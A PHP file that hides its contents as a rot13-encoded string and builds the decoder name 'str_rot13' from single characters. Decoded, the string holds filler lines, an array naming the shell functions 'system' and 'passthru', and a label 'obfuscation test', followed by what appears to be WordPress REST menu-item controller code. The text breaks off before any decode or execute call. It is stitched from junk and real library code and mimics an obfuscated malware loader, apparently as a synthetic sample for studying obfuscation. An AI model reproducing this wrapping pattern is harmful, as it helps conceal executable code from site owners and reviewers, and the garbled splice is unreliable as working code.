<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Zrah_Vgrzf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 */

/**
 * Pber pynff gb npprff ani vgrzf ivn gur ERFG NCV.
 *
 * @fvapr 5.9.0
 *
 * @frr JC_ERFG_Cbfgf_Pbagebyyre
 */
pynff JC_ERFG_Zrah_Vgrzf_Pbagebyyre rkgraqf JC_ERFG_Cbfgf_Pbagebyyre {

	/**
	 * Trgf gur ani zrah vgrz, vs gur VQ vf inyvq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea bowrpg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_ani_zrah_vgrz( $vq ) {
		$cbfg = $guvf->trg_cbfg( $vq );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		erghea jc_frghc_ani_zrah_vgrz( $cbfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq zrah vgrzf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$unf_crezvffvba = cnerag::trg_vgrzf_crezvffvbaf_purpx( $erdhrfg );

		vs ( gehr !== $unf_crezvffvba ) {
			erghea $unf_crezvffvba;
		}

		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n zrah vgrz vs gurl unir npprff gb rqvg gurz.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg be snyfr bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$crezvffvba_purpx = cnerag::trg_vgrz_crezvffvbaf_purpx( $erdhrfg );

		vs ( gehr !== $crezvffvba_purpx ) {
			erghea $crezvffvba_purpx;
		}

		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Purpxf jurgure gur pheerag hfre unf ernq crezvffvba sbe gur raqcbvag.
	 *
	 * Guvf nyybjf sbe nal hfre gung pna `rqvg_gurzr_bcgvbaf` be rqvg nal ERFG NCV ninvynoyr cbfg glcr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_unf_ernq_bayl_npprff( $erdhrfg ) {
		/**
		 * Svygref jurgure gur pheerag hfre unf ernq npprff gb zrah vgrzf ivn gur ERFG NCV.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz obby               $ernq_bayl_npprff Jurgure gur pheerag hfre unf ernq npprff gb zrah vgrzf
		 *                                             ivn gur ERFG NCV.
		 * @cnenz JC_ERFG_Erdhrfg    $erdhrfg          Shyy qrgnvyf nobhg gur erdhrfg.
		 * @cnenz JC_ERFG_Pbagebyyre $pbagebyyre       Gur pheerag vafgnapr bs gur pbagebyyre.
		 */
		$ernq_bayl_npprff = nccyl_svygref( 'erfg_zrah_ernq_npprff', snyfr, $erdhrfg, $guvf );
		vs ( $ernq_bayl_npprff ) {
			erghea gehr;
		}

		vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea gehr;
		}

		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj zrah vgrzf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Perngrf n fvatyr ani zrah vgrz.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['vq'] ) ) {
			erghea arj JC_Reebe( 'erfg_cbfg_rkvfgf', __( 'Pnaabg perngr rkvfgvat cbfg.' ), neenl( 'fgnghf' => 400 ) );
		}

		$cercnerq_ani_vgrz = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cercnerq_ani_vgrz ) ) {
			erghea $cercnerq_ani_vgrz;
		}
		$cercnerq_ani_vgrz = (neenl) $cercnerq_ani_vgrz;

		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz( $cercnerq_ani_vgrz['zrah-vq'], $cercnerq_ani_vgrz['zrah-vgrz-qo-vq'], jc_fynfu( $cercnerq_ani_vgrz ), snyfr );
		vs ( vf_jc_reebe( $ani_zrah_vgrz_vq ) ) {
			vs ( 'qo_vafreg_reebe' === $ani_zrah_vgrz_vq->trg_reebe_pbqr() ) {
				$ani_zrah_vgrz_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$ani_zrah_vgrz_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $ani_zrah_vgrz_vq;
		}

		$ani_zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $ani_zrah_vgrz_vq );
		vs ( vf_jc_reebe( $ani_zrah_vgrz ) ) {
			$ani_zrah_vgrz->nqq_qngn( neenl( 'fgnghf' => 404 ) );

			erghea $ani_zrah_vgrz;
		}

		/**
		 * Sverf nsgre n fvatyr zrah vgrz vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz bowrpg          $ani_zrah_vgrz Vafregrq be hcqngrq zrah vgrz bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat      Gehr jura perngvat n zrah vgrz, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_vafreg_ani_zrah_vgrz', $ani_zrah_vgrz, $erdhrfg, gehr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $ani_zrah_vgrz_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$ani_zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $ani_zrah_vgrz_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $ani_zrah_vgrz, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/**
		 * Sverf nsgre n fvatyr zrah vgrz vf pbzcyrgryl perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz bowrpg          $ani_zrah_vgrz Vafregrq be hcqngrq zrah vgrz bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat      Gehr jura perngvat n zrah vgrz, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_nsgre_vafreg_ani_zrah_vgrz', $ani_zrah_vgrz, $erdhrfg, gehr );

		$cbfg = trg_cbfg( $ani_zrah_vgrz_vq );
		jc_nsgre_vafreg_cbfg( $cbfg, snyfr, ahyy );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $ani_zrah_vgrz_vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Hcqngrf n fvatyr ani zrah vgrz.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$inyvq_purpx = $guvf->trg_ani_zrah_vgrz( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $inyvq_purpx ) ) {
			erghea $inyvq_purpx;
		}
		$cbfg_orsber       = trg_cbfg( $erdhrfg['vq'] );
		$cercnerq_ani_vgrz = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cercnerq_ani_vgrz ) ) {
			erghea $cercnerq_ani_vgrz;
		}

		$cercnerq_ani_vgrz = (neenl) $cercnerq_ani_vgrz;

		$ani_zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz( $cercnerq_ani_vgrz['zrah-vq'], $cercnerq_ani_vgrz['zrah-vgrz-qo-vq'], jc_fynfu( $cercnerq_ani_vgrz ), snyfr );

		vs ( vf_jc_reebe( $ani_zrah_vgrz_vq ) ) {
			vs ( 'qo_hcqngr_reebe' === $ani_zrah_vgrz_vq->trg_reebe_pbqr() ) {
				$ani_zrah_vgrz_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$ani_zrah_vgrz_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $ani_zrah_vgrz_vq;
		}

		$ani_zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $ani_zrah_vgrz_vq );
		vs ( vf_jc_reebe( $ani_zrah_vgrz ) ) {
			$ani_zrah_vgrz->nqq_qngn( neenl( 'fgnghf' => 404 ) );

			erghea $ani_zrah_vgrz;
		}

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-zrah-vgrzf-pbagebyyre.cuc */
		qb_npgvba( 'erfg_vafreg_ani_zrah_vgrz', $ani_zrah_vgrz, $erdhrfg, snyfr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $ani_zrah_vgrz->VQ );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$cbfg          = trg_cbfg( $ani_zrah_vgrz_vq );
		$ani_zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $ani_zrah_vgrz_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $ani_zrah_vgrz, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-zrah-vgrzf-pbagebyyre.cuc */
		qb_npgvba( 'erfg_nsgre_vafreg_ani_zrah_vgrz', $ani_zrah_vgrz, $erdhrfg, snyfr );

		jc_nsgre_vafreg_cbfg( $cbfg, gehr, $cbfg_orsber );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( trg_cbfg( $ani_zrah_vgrz_vq ), $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Qryrgrf n fvatyr ani zrah vgrz.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Gehr ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $zrah_vgrz ) ) {
			erghea $zrah_vgrz;
		}

		// Jr qba'g fhccbeg genfuvat sbe zrah vgrzf.
		vs ( ! $erdhrfg['sbepr'] ) {
			/* genafyngbef: %f: sbepr=gehr */
			erghea arj JC_Reebe( 'erfg_genfu_abg_fhccbegrq', fcevags( __( \"Zrah vgrzf qb abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ), neenl( 'fgnghf' => 501 ) );
		}

		$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( trg_cbfg( $erdhrfg['vq'] ), $erdhrfg );

		$erfhyg = jc_qryrgr_cbfg( $erdhrfg['vq'], gehr );

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe( 'erfg_pnaabg_qryrgr', __( 'Gur cbfg pnaabg or qryrgrq.' ), neenl( 'fgnghf' => 500 ) );
		}

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_qngn(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cerivbhf->trg_qngn(),
			)
		);

		/**
		 * Sverf vzzrqvngryl nsgre n fvatyr zrah vgrz vf qryrgrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz bowrpg          $ani_zrah_vgrz Vafregrq be hcqngrq zrah vgrz bowrpg.
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr qngn.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Erdhrfg bowrpg.
		 */
		qb_npgvba( 'erfg_qryrgr_ani_zrah_vgrz', $zrah_vgrz, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr ani zrah vgrz sbe perngr be hcqngr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 *
	 * @erghea bowrpg|JC_Reebe
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$zrah_vgrz_qo_vq = $erdhrfg['vq'];
		$zrah_vgrz_bow   = $guvf->trg_ani_zrah_vgrz( $zrah_vgrz_qo_vq );
		// Arrq gb crefvfg gur zrah vgrz qngn. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28138
		vs ( ! vf_jc_reebe( $zrah_vgrz_bow ) ) {
			// Pbeerpg gur zrah cbfvgvba vs guvf jnf gur svefg vgrz. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28140
			$cbfvgvba = ( 0 === $zrah_vgrz_bow->zrah_beqre ) ? 1 : $zrah_vgrz_bow->zrah_beqre;

			$cercnerq_ani_vgrz = neenl(
				'zrah-vgrz-qo-vq'       => $zrah_vgrz_qo_vq,
				'zrah-vgrz-bowrpg-vq'   => $zrah_vgrz_bow->bowrpg_vq,
				'zrah-vgrz-bowrpg'      => $zrah_vgrz_bow->bowrpg,
				'zrah-vgrz-cnerag-vq'   => $zrah_vgrz_bow->zrah_vgrz_cnerag,
				'zrah-vgrz-cbfvgvba'    => $cbfvgvba,
				'zrah-vgrz-glcr'        => $zrah_vgrz_bow->glcr,
				'zrah-vgrz-gvgyr'       => $zrah_vgrz_bow->gvgyr,
				'zrah-vgrz-hey'         => $zrah_vgrz_bow->hey,
				'zrah-vgrz-qrfpevcgvba' => $zrah_vgrz_bow->qrfpevcgvba,
				'zrah-vgrz-ngge-gvgyr'  => $zrah_vgrz_bow->ngge_gvgyr,
				'zrah-vgrz-gnetrg'      => $zrah_vgrz_bow->gnetrg,
				'zrah-vgrz-pynffrf'     => $zrah_vgrz_bow->pynffrf,
				// Fgberq va gur qngnonfr nf n fgevat.
				'zrah-vgrz-ksa'         => rkcybqr( ' ', $zrah_vgrz_bow->ksa ),
				'zrah-vgrz-fgnghf'      => $zrah_vgrz_bow->cbfg_fgnghf,
				'zrah-vq'               => $guvf->trg_zrah_vq( $zrah_vgrz_qo_vq ),
			);
		} ryfr {
			$cercnerq_ani_vgrz = neenl(
				'zrah-vq'               => 0,
				'zrah-vgrz-qo-vq'       => 0,
				'zrah-vgrz-bowrpg-vq'   => 0,
				'zrah-vgrz-bowrpg'      => '',
				'zrah-vgrz-cnerag-vq'   => 0,
				'zrah-vgrz-cbfvgvba'    => 1,
				'zrah-vgrz-glcr'        => 'phfgbz',
				'zrah-vgrz-gvgyr'       => '',
				'zrah-vgrz-hey'         => '',
				'zrah-vgrz-qrfpevcgvba' => '',
				'zrah-vgrz-ngge-gvgyr'  => '',
				'zrah-vgrz-gnetrg'      => '',
				'zrah-vgrz-pynffrf'     => neenl(),
				'zrah-vgrz-ksa'         => neenl(),
				'zrah-vgrz-fgnghf'      => 'choyvfu',
			);
		}

		$znccvat = neenl(
			'zrah-vgrz-qo-vq'       => 'vq',
			'zrah-vgrz-bowrpg-vq'   => 'bowrpg_vq',
			'zrah-vgrz-bowrpg'      => 'bowrpg',
			'zrah-vgrz-cnerag-vq'   => 'cnerag',
			'zrah-vgrz-cbfvgvba'    => 'zrah_beqre',
			'zrah-vgrz-glcr'        => 'glcr',
			'zrah-vgrz-hey'         => 'hey',
			'zrah-vgrz-qrfpevcgvba' => 'qrfpevcgvba',
			'zrah-vgrz-ngge-gvgyr'  => 'ngge_gvgyr',
			'zrah-vgrz-gnetrg'      => 'gnetrg',
			'zrah-vgrz-pynffrf'     => 'pynffrf',
			'zrah-vgrz-ksa'         => 'ksa',
			'zrah-vgrz-fgnghf'      => 'fgnghf',
		);

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		sbernpu ( $znccvat nf $bevtvany => $ncv_erdhrfg ) {
			vs ( vffrg( $erdhrfg[ $ncv_erdhrfg ] ) ) {
				$cercnerq_ani_vgrz[ $bevtvany ] = $erdhrfg[ $ncv_erdhrfg ];
			}
		}

		$gnkbabzl = trg_gnkbabzl( 'ani_zrah' );
		$onfr     = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;
		// Vs zrahf fhozvggrq, pnfg gb vag.
		vs ( ! rzcgl( $erdhrfg[ $onfr ] ) ) {
			$cercnerq_ani_vgrz['zrah-vq'] = nofvag( $erdhrfg[ $onfr ] );
		}

		// Ani zrah gvgyr.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['gvgyr'] ) && vffrg( $erdhrfg['gvgyr'] ) ) {
			vs ( vf_fgevat( $erdhrfg['gvgyr'] ) ) {
				$cercnerq_ani_vgrz['zrah-vgrz-gvgyr'] = $erdhrfg['gvgyr'];
			} ryfrvs ( ! rzcgl( $erdhrfg['gvgyr']['enj'] ) ) {
				$cercnerq_ani_vgrz['zrah-vgrz-gvgyr'] = $erdhrfg['gvgyr']['enj'];
			}
		}

		$reebe = arj JC_Reebe();

		// Purpx vs bowrpg vq rkvfgf orsber fnivat.
		vs ( ! $cercnerq_ani_vgrz['zrah-vgrz-bowrpg'] ) {
			// Vs gnkbabzl, purpx vs grez rkvfgf.
			vs ( 'gnkbabzl' === $cercnerq_ani_vgrz['zrah-vgrz-glcr'] ) {
				$bevtvany = trg_grez( nofvag( $cercnerq_ani_vgrz['zrah-vgrz-bowrpg-vq'] ) );
				vs ( rzcgl( $bevtvany ) || vf_jc_reebe( $bevtvany ) ) {
					$reebe->nqq( 'erfg_grez_vainyvq_vq', __( 'Vainyvq grez VQ.' ), neenl( 'fgnghf' => 400 ) );
				} ryfr {
					$cercnerq_ani_vgrz['zrah-vgrz-bowrpg'] = trg_grez_svryq( 'gnkbabzl', $bevtvany );
				}
				// Vs cbfg, purpx vs cbfg bowrpg rkvfgf.
			} ryfrvs ( 'cbfg_glcr' === $cercnerq_ani_vgrz['zrah-vgrz-glcr'] ) {
				$bevtvany = trg_cbfg( nofvag( $cercnerq_ani_vgrz['zrah-vgrz-bowrpg-vq'] ) );
				vs ( rzcgl( $bevtvany ) ) {
					$reebe->nqq( 'erfg_cbfg_vainyvq_vq', __( 'Vainyvq cbfg VQ.' ), neenl( 'fgnghf' => 400 ) );
				} ryfr {
					$cercnerq_ani_vgrz['zrah-vgrz-bowrpg'] = trg_cbfg_glcr( $bevtvany );
				}
			}
		}

		// Vs cbfg glcr nepuvir, purpx vs cbfg glcr rkvfgf.
		vs ( 'cbfg_glcr_nepuvir' === $cercnerq_ani_vgrz['zrah-vgrz-glcr'] ) {
			$cbfg_glcr = $cercnerq_ani_vgrz['zrah-vgrz-bowrpg'] ? $cercnerq_ani_vgrz['zrah-vgrz-bowrpg'] : snyfr;
			$bevtvany  = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
			vs ( ! $bevtvany ) {
				$reebe->nqq( 'erfg_cbfg_vainyvq_glcr', __( 'Vainyvq cbfg glcr.' ), neenl( 'fgnghf' => 400 ) );
			}
		}

		// Purpx vs zrah vgrz vf glcr phfgbz, gura gvgyr naq hey ner erdhverq.
		vs ( 'phfgbz' === $cercnerq_ani_vgrz['zrah-vgrz-glcr'] ) {
			vs ( '' === $cercnerq_ani_vgrz['zrah-vgrz-gvgyr'] ) {
				$reebe->nqq( 'erfg_gvgyr_erdhverq', __( 'Gur gvgyr vf erdhverq jura hfvat n phfgbz zrah vgrz glcr.' ), neenl( 'fgnghf' => 400 ) );
			}
			vs ( rzcgl( $cercnerq_ani_vgrz['zrah-vgrz-hey'] ) ) {
				$reebe->nqq( 'erfg_hey_erdhverq', __( 'Gur hey vf erdhverq jura hfvat n phfgbz zrah vgrz glcr.' ), neenl( 'fgnghf' => 400 ) );
			}
		}

		vs ( $reebe->unf_reebef() ) {
			erghea $reebe;
		}

		// Gur ksa naq pynffrf cebcregvrf ner neenlf, ohg cnffrq gb jc_hcqngr_ani_zrah_vgrz nf n fgevat.
		sbernpu ( neenl( 'zrah-vgrz-ksa', 'zrah-vgrz-pynffrf' ) nf $xrl ) {
			$cercnerq_ani_vgrz[ $xrl ] = vzcybqr( ' ', $cercnerq_ani_vgrz[ $xrl ] );
		}

		// Bayl qensg / choyvfu ner inyvq cbfg fgnghf sbe zrah vgrzf.
		vs ( 'choyvfu' !== $cercnerq_ani_vgrz['zrah-vgrz-fgnghf'] ) {
			$cercnerq_ani_vgrz['zrah-vgrz-fgnghf'] = 'qensg';
		}

		$cercnerq_ani_vgrz = (bowrpg) $cercnerq_ani_vgrz;

		/**
		 * Svygref n zrah vgrz orsber vg vf vafregrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz bowrpg          $cercnerq_ani_vgrz Na bowrpg ercerfragvat n fvatyr zrah vgrz cercnerq
		 *                                           sbe vafregvat be hcqngvat gur qngnonfr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg           Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cer_vafreg_ani_zrah_vgrz', $cercnerq_ani_vgrz, $erdhrfg );
	}

	/**
	 * Cercnerf n fvatyr ani zrah vgrz bhgchg sbe erfcbafr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Onfr svryqf sbe rirel cbfg.
		$svryqf    = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $vgrz->VQ );
		$qngn      = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = $zrah_vgrz->VQ;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr', $svryqf ) ) {
			$qngn['gvgyr'] = neenl();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.enj', $svryqf ) ) {
			$qngn['gvgyr']['enj'] = $zrah_vgrz->gvgyr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.eraqrerq', $svryqf ) ) {
			nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			$gvgyr = nccyl_svygref( 'gur_gvgyr', $zrah_vgrz->gvgyr, $zrah_vgrz->VQ );

			$qngn['gvgyr']['eraqrerq'] = $gvgyr;

			erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fgnghf', $svryqf ) ) {
			$qngn['fgnghf'] = $zrah_vgrz->cbfg_fgnghf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'hey', $svryqf ) ) {
			$qngn['hey'] = $zrah_vgrz->hey;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'ngge_gvgyr', $svryqf ) ) {
			// Fnzr nf cbfg_rkprecg.
			$qngn['ngge_gvgyr'] = $zrah_vgrz->ngge_gvgyr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'qrfpevcgvba', $svryqf ) ) {
			// Fnzr nf cbfg_pbagrag.
			$qngn['qrfpevcgvba'] = $zrah_vgrz->qrfpevcgvba;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'glcr', $svryqf ) ) {
			$qngn['glcr'] = $zrah_vgrz->glcr;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'glcr_ynory', $svryqf ) ) {
			$qngn['glcr_ynory'] = $zrah_vgrz->glcr_ynory;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'bowrpg', $svryqf ) ) {
			$qngn['bowrpg'] = $zrah_vgrz->bowrpg;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'bowrpg_vq', $svryqf ) ) {
			// Vg vf fgberq nf n fgevat, ohg fubhyq or rkcbfrq nf na vagrtre.
			$qngn['bowrpg_vq'] = nofvag( $zrah_vgrz->bowrpg_vq );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'cnerag', $svryqf ) ) {
			// Fnzr nf cbfg_cnerag, rkcbfrq nf na vagrtre.
			$qngn['cnerag'] = (vag) $zrah_vgrz->zrah_vgrz_cnerag;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrah_beqre', $svryqf ) ) {
			// Fnzr nf cbfg_cnerag, rkcbfrq nf na vagrtre.
			$qngn['zrah_beqre'] = (vag) $zrah_vgrz->zrah_beqre;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gnetrg', $svryqf ) ) {
			$qngn['gnetrg'] = $zrah_vgrz->gnetrg;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'pynffrf', $svryqf ) ) {
			$qngn['pynffrf'] = (neenl) $zrah_vgrz->pynffrf;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'ksa', $svryqf ) ) {
			$qngn['ksa'] = neenl_znc( 'fnavgvmr_ugzy_pynff', rkcybqr( ' ', $zrah_vgrz->ksa ) );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'vainyvq', $svryqf ) ) {
			$qngn['vainyvq'] = (obby) $zrah_vgrz->_vainyvq;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'zrgn', $svryqf ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $zrah_vgrz->VQ, $erdhrfg );
		}

